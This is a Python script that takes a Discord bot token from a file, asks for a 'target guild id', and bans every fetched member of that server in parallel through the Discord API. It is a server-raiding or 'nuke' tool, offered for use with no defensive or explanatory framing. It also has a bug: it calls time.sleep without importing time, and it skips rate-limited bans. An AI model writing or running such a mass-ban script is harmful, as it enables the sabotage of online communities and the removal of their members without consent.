import requests
import json
import concurrent.futures


def ball():
    with open("token.txt", "r") as file:
        token = file.readline().strip()
    headers = {'Authorization': f'Bot {token}'}
    if token == "":
        print("Empty token")
    elif token == "single token here":
        print("Edit the file token.txt dumbass")
    else:
        print("This will only work with bot tokens")
        massban(token, headers)


def massban(token, headers):
    guild_id = input("Enter the target guild id: ")
    hm = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000', headers=headers)
    if hm.status_code == 200:
        members = hm.json()
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            ban_tasks = [executor.submit(ban_member, guild_id, member['user']['id'], token, headers) for member in members]
            concurrent.futures.wait(ban_tasks)
    else:
        print(f"Error code: {hm.status_code}")


def ban_member(guild_id, user_id, token, headers):
    response = requests.put(f'https://discord.com/api/v9/guilds/{guild_id}/bans/{user_id}', headers=headers)
    if response.status_code == 204:
        print(f"Banned {user_id}")
    elif response.status_code == 429:
        print(f"Rate limited, waiting 0.7 seconds... {response.status_code}")
        time.sleep(0.7)
    else:
        print(f"Failed to ban {user_id} {response.status_code}")


ball()
